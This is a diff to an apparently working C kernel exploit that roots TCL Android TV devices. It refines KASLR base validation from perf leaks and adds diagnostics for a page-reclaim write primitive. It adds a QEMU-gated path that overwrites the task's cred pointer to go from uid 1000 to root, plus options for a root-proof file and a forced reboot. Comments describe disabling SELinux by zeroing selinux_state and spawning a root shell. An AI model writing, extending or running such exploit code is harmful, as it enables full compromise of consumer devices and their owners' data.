@@ -669,6 +669,7 @@ static void *tcl_split_consumer(void *opaque) {
       first + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF) : 0;
   errno = 0;
   long sr = sched_setattr_tid((int)atomic_load(&s->helper_tid), 7);
+  int sched_errno = errno;
   int found = -1;
   uint64_t cleared = page_base + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF;
   for (int b = 0; ; b++) {
@@ -681,6 +682,13 @@ static void *tcl_split_consumer(void *opaque) {
       break;
     }
   }
+  pr_info("TCL split diag: sched_ret=%ld errno=%d found=%d "
+          "armed=%016llx cleared=%016llx mcast_ret=%d mcast_errno=%d "
+          "wait_ret=%d wait_errno=%d disarm_errno=%d\n",
+          sr, sched_errno, found, (unsigned long long)armed,
+          (unsigned long long)cleared, s->diag_mcast_ret,
+          s->diag_mcast_errno, s->diag_wait_ret, s->diag_wait_errno,
+          s->diag_disarm_errno);
   if (sr == 0 && found >= 0) {
     if (pselect_custom_write == 5) {
       uint8_t *hit = uring_block(found);
@@ -1488,9 +1496,13 @@ static uintptr_t perf_leak_own_task(void) {
     int base_ok = 1;
     if (active_offsets && active_offsets->kimage_text_base) {
       uint64_t link = active_offsets->kimage_text_base;
-      uint64_t slide = base - link; /* unsigned wrap if base < link */
-      if (base < link || (slide & (0x200000ULL - 1)) != 0 ||
-          slide >= 0x4000000000ULL /* VA39 KASLR region bound */) {
+      /* KASLR may place the runtime image below OR above the link address.
+       * The V643 salon boot observed anchor=0xffffffc003800000, exactly
+       * 0x04800000 below link _text.  Validate the absolute distance rather
+       * than rejecting every negative slide through unsigned wrap. */
+      uint64_t distance = base >= link ? base - link : link - base;
+      if ((distance & (0x200000ULL - 1)) != 0 ||
+          distance >= 0x4000000000ULL /* VA39 KASLR region bound */) {
         base_ok = 0;
         pr_warning("perf min_ip=%016lx -> anchor %016lx fails sanity vs "
                    "link _text %016lx (delta must be a 2MB multiple)\n",
@@ -1995,6 +2007,104 @@ static int run_selftest(void) {
   return g_route_write_ok ? 0 : 1;
 }
 
+#if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
+/* QEMU-only gate for the final TCL strategy.  The first cycle proves a
+ * page-local arbitrary write.  The second cycle starts from a completely
+ * fresh mm_struct reclaim and changes this task's cred pointer, after which
+ * run_main_route_threads() asks the normal credential subsystem to commit a
+ * legitimate uid/gid-0 credential.  /dev/glqemu-root exists only in the
+ * disposable laboratory kernel and is never present on a TCL television. */
+static int run_qemu_two_cycle_root(void) {
+  struct tcl_qemu_root_layout {
+    uint64_t page_kva;
+    uint64_t current_task;
+    uint64_t fake_cred;
+    uint64_t sched_task_group;
+    uint32_t page_order;
+    uint32_t task_cred_off;
+    uint32_t task_real_cred_off;
+    uint32_t cred_size;
+  } layout;
+#define TCL_QEMU_GET_LAYOUT _IOR(0x47, 1, struct tcl_qemu_root_layout)
+
+  disable_rseq_for_thread();
+  set_unbuffer();
+  set_limit();
+  if (!active_offsets && select_offsets() < 0) return 1;
+  if (!active_offsets ||
+      active_offsets->reclaim_route != GHOST_RECLAIM_TCL_V643_EXACT ||
+      active_offsets->stack_overlay_route !=
+          GHOST_STACK_OVERLAY_TCL_V643_MCAST_COMPAT) {
+    pr_error("QEMU two-cycle gate requires the exact TCL split profile\n");
+    return 1;
+  }
+  init_p0_profile();
+  init_ashmem_path();
+  pin_to_core(CORE);
+  kaslr_base = active_offsets->kimage_text_base;
+  kaslr_done = 1;
+  timer_reset();
+
+  int qfd = open("/dev/glqemu-root", O_RDONLY | O_CLOEXEC);
+  memset(&layout, 0, sizeof(layout));
+  if (qfd < 0 || ioctl(qfd, TCL_QEMU_GET_LAYOUT, &layout) != 0) {
+    pr_error("QEMU layout observer unavailable errno=%d\n", errno);
+    if (qfd >= 0) close(qfd);
+    return 1;
+  }
+  close(qfd);
+  if (!layout.current_task || layout.page_order != 2 ||
+      layout.task_cred_off != TASK_CRED_OFF ||
+      layout.task_real_cred_off != TASK_REAL_CRED_OFF ||
+      layout.cred_size != CRED15_SIZE) {
+    pr_error("QEMU layout mismatch task=%016llx order=%u cred=%#x/%#x size=%u\n",
+             (unsigned long long)layout.current_task, layout.page_order,
+             layout.task_cred_off, layout.task_real_cred_off,
+             layout.cred_size);
+    return 1;
+  }
+  const char *ns = getenv("TCL_QEMU_INIT_USER_NS");
+  if (!ns || !ns[0]) {
+    pr_error("TCL_QEMU_INIT_USER_NS is required by the QEMU gate\n");
+    return 1;
+  }
+  g_init_user_ns_addr = strtoull(ns, NULL, 0);
+  g_leaked_task = layout.current_task;
+  if (!g_init_user_ns_addr) return 1;
+
+  if (getuid() == 0 &&
+      (setresgid(1000, 1000, 1000) != 0 ||
+       setresuid(1000, 1000, 1000) != 0)) {
+    pr_error("QEMU gate could not drop to uid/gid 1000 errno=%d\n", errno);
+    return 1;
+  }
+  if (getuid() != 1000) {
+    pr_error("QEMU gate must start unprivileged (uid=%d)\n", getuid());
+    return 1;
+  }
+
+  pr_info("GL2CYCLE start uid=%d task=%016llx init_user_ns=%016lx\n",
+          getuid(), (unsigned long long)g_leaked_task,
+          (unsigned long)g_init_user_ns_addr);
+  if (!do_one_write(0, "QEMU cycle 1 page-local write", 5) ||
+      !g_route_write_ok) {
+    pr_error("GL2CYCLE cycle 1 failed\n");
+    return 1;
+  }
+  pr_info("GL2CYCLE cycle 1 PASS; starting fresh reclaim\n");
+  if (!do_one_write(g_leaked_task + TASK_CRED_OFF,
+                    "QEMU cycle 2 credential root", WRITE_MODE_CRED) ||
+      !g_route_write_ok || getuid() != 0 || geteuid() != 0 || getgid() != 0) {
+    pr_error("GL2CYCLE cycle 2 failed uid=%d euid=%d gid=%d\n",
+             getuid(), geteuid(), getgid());
+    return 1;
+  }
+  pr_success("GL2CYCLE PASS: two fresh production reclaims changed uid 1000 -> 0\n");
+  return 0;
+#undef TCL_QEMU_GET_LAYOUT
+}
+#endif
+
 /* --cred: task_struct leak (perf regs) + KASLR base (perf min_ip) +
  * three-walk route (mode 7, default):
  *   walk 0: 8-byte ZERO at selinux_state (enforcing=0 AND initialized=0
@@ -2461,6 +2571,8 @@ static int run_cred_swap(void) {
   uint32_t uid_before = getuid();
   int ghost_exec = env_flag("GHOST_EXEC", 1);
   int ghost_probe = env_flag("GHOST_PROBE", 0); /* post-root DAC/SELinux bisection probes */
+  int ghost_minimal = env_flag("GHOST_MINIMAL", 0); /* root proof without sensitive reads */
+  int ghost_reboot = env_flag("GHOST_REBOOT", 0); /* volatile lab cleanup */
   int attempts = env_int_range("CRED_ATTEMPTS", 3, 1, 6);
   for (int att = 1; att <= attempts; att++) {
     pr_info("%s attempt %d/%d\n",
@@ -3036,6 +3148,28 @@ static int run_cred_swap(void) {
           syscall(__NR_fsync, mf);
           syscall(__NR_close, mf);
         }
+        if (ghost_minimal) {
+          int of = (int)syscall(__NR_openat, AT_FDCWD,
+                                "/data/local/tmp/.ghostlock_out",
+                                O_WRONLY|O_CREAT|O_TRUNC, 0644);
+          if (of >= 0) {
+            RAW_WRITE(of, "=== ghostlock minimal root proof ===\nuid=");
+            raw_wdec(of, (long)uid_now);
+            RAW_WRITE(of, " gid=");
+            raw_wdec(of, (long)syscall(__NR_getgid));
+            RAW_WRITE(of, " euid=");
+            raw_wdec(of, (long)syscall(__NR_geteuid));
+            RAW_WRITE(of, " erase_hits=");
+            raw_wdec(of, hits);
+            RAW_WRITE(of, "/");
+            raw_wdec(of, plans);
+            RAW_WRITE(of, " selinux=");
+            raw_wstr(of, g_selinux_off ? "OFF\n" : "UNKNOWN\n");
+            syscall(__NR_fsync, of);
+            syscall(__NR_close, of);
+          }
+          goto ghost_battery_done;
+        }
         /* The root test battery. If the battery file cannot even be
          * created (SELinux still enforcing - mode-6 fallback), probe
          * into stdout instead so the results are never lost. */
@@ -3209,6 +3343,27 @@ static int run_cred_swap(void) {
           }
         }
       }
+ghost_battery_done:
+      ;
+      if (!ghost_exec && relay != MAP_FAILED) {
+        /* Non-interactive validation must not leave the original-shell
+         * relay child holding the adb transport open after the root parent
+         * exits.  The child checks ready==99 in its command loop. */
+        __atomic_thread_fence(__ATOMIC_SEQ_CST);
+        relay->ready = 99;
+      }
+      if (ghost_reboot) {
+        RAW_WRITE(1, "[+] GHOST_REBOOT=1: syncing and requesting kernel restart\n");
+        syscall(__NR_sync);
+        long reboot_ret = syscall(__NR_reboot, LINUX_REBOOT_MAGIC1,
+                                  LINUX_REBOOT_MAGIC2,
+                                  LINUX_REBOOT_CMD_RESTART, NULL);
+        RAW_WRITE(1, "[!] kernel reboot syscall returned ");
+        raw_wdec(1, reboot_ret);
+        RAW_WRITE(1, " errno=");
+        raw_wdec(1, errno);
+        RAW_WRITE(1, "\n");
+      }
       #undef PROBE
       /* Root shell. execve is safe ONLY when every planned erase landed
        * AND the capture was a full 16KB mapping (uring/spectrum/skb):
@@ -3307,6 +3462,10 @@ int main(int argc, char **argv) {
     signal(SIGPIPE, SIG_IGN);
     if (argc > 1 && strcmp(argv[1], "--selftest") == 0)
         return run_selftest();
+#if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
+    if (argc > 1 && strcmp(argv[1], "--qemu-two-cycle-root") == 0)
+        return run_qemu_two_cycle_root();
+#endif
     if (argc > 1 && strcmp(argv[1], "--cred") == 0)
         return run_cred_swap();
     fprintf(stderr,
